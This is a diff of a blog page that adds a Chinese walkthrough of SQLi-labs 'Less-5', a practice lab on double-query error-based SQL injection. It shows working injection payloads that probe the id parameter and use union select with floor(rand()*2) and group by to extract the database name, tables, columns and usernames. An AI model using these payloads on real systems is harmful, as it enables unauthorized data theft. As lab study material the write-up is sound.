@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>LoveCtrl-Tan</title>
+<title>Less-5 | LoveCtrl-Tan</title>
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -91,17 +91,12 @@
 
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://lovectrl-tan.github.io/post/di-wu-guan">
-                  <h2 class="post-title">Less-5</h2>
-                </a>
-                <div class="post-date">
-                  2019-10-23
-                </div>
-                <div class="post-abstract">
-                  <p>惯例，我们来查看提示<br>
+          <div class="post-detail">
+            <h2 class="post-title">Less-5</h2>
+            <div class="post-date">2019-10-23</div>
+            
+            <div class="post-content">
+              <p>惯例，我们来查看提示<br>
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023210657.png" alt=""></p>
 <h2 id="双查询报错注入">双查询报错注入</h2>
 <p>需要用到四个函数和一个<code>group by</code>语句<br>
@@ -110,47 +105,54 @@
 3.<code>floor()</code>-&gt;取整函数//用来对生成的随机数取整<br>
 4.<code>concat()</code>-&gt;连接字符串<br>
 5.<code>count()</code>-&gt;统计函数//结合group by 语句统计分组后的数据</p>
+<!-- more -->
+<p>我们先了解以下子查询的概念</p>
+<pre><code class="language-txt">子查询又称为内部查询，子查询允许吧一个查询嵌套在另一个查询当中
+</code></pre>
+<p>我们知道他想考察双注入单引号的类型，我们输入参数<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023210901.png" alt=""><br>
+发现它跟之前的返回不同了照例判断是否存在注入漏洞<code>?id=1' and 1=1--+</code> <code>?id=1' and 1=2--+</code><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023211004.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023211012.png" alt=""><br>
+我们接着来查询字段数<code>order by</code><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025105025.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025105039.png" alt=""><br>
+接着我们只用双注入查询数据库名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025112717.png" alt=""><br>
+我们去掉随机数即是库名，注意，由于有随机性，可能成功执行了语句所以不会报错，即显示正常，我们多提交几遍就可以了</p>
+<!-- more -->
+<p>接着我们继续查询表名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113147.png" alt=""><br>
+查询字段名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 3,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113752.png" alt=""><br>
+现在我们库名，表名和字段名都知道啦，我们构造以下语句来查询数据</p>
+<pre><code>?id=-1%27 union select 1,count(*),concat((select username from security.users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113920.png" alt=""><br>
+剩下语法相似，我就不一一描述</p>
 
-                </div>
-              </div>
-              
-            </article>
-          
-            <article class="post-item">
-              <div class="left">
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
                 <a href="https://lovectrl-tan.github.io/post/dvwa">
-                  <h2 class="post-title">DVWA</h2>
+                  <h3 class="post-title">
+                    DVWA
+                  </h3>
                 </a>
-                <div class="post-date">
-                  2019-10-19
-                </div>
-                <div class="post-abstract">
-                  
-                </div>
               </div>
-              
-            </article>
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://lovectrl-tan.github.io/post/sql-labs">
-                  <h2 class="post-title">SQL-LABS</h2>
-                </a>
-                <div class="post-date">
-                  2019-10-17
-                </div>
-                <div class="post-abstract">
-                  
-                </div>
-              </div>
-              
-            </article>
-          
+            
 
-          <div class="pagination-container">
-  
-  
-</div>
+            
+
+          </div>
 
         </div>
       </div>
